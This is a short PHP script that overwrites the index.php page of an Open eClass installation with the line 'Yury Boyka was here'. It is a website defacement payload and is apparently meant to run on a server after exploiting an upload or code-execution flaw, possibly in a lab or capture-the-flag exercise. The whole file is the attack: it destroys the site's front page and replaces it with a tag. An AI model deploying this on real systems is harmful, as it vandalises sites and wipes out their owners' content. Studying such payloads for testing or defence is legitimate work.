<?php
$file_path = '/var/www/openeclass/index.php';
$content = '<h1> Yury Boyka was here</h1>';

if (file_put_contents($file_path, $content) !== false) {
    echo "File written successfully";
} else {
    echo "Error writing to the file";
}
?>
